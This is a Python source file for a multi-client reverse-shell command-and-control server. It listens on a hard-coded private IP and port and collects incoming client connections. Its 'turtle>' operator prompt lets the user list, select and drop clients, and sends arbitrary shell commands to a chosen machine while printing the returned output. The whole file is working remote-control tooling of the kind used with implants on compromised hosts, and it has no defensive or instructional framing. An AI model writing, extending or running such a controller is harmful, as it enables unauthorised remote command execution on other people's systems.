import socket
import threading
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []

# Global server control flag
server_running = True


def create_socket():
    try:
        global host
        global port
        global s
        host = "192.168.0.75"#Server IP
        port = 9978
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")



def help():
    print("Available commands:")
    print("list - Display all active connections")
    print("select <index> - Select a client to interact with")
    print("end <ID> - End the current connection")
    print("help - Display this help message")

def start_turtle():
    global server_running
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif 'end' in cmd:
            end_connection(cmd)
        elif cmd == 'help':
            help()
        else:
            print("Command not recognized")


def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = results + str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print("----Clients----" + "\n" + results)


def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
    except:
        print("Selection not valid")
        return None


def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


def end_connection(cmd):
    """End a specific client connection."""
    try:
        target = cmd.replace('end ', '')  # target = id
        target = int(target)
        conn = all_connections[target]
        conn.close()  # Close the connection
        del all_connections[target]
        del all_address[target]
        print(f"Connection {target} ended successfully.")
    except:
        print("Error ending connection")



def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    while server_running:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()
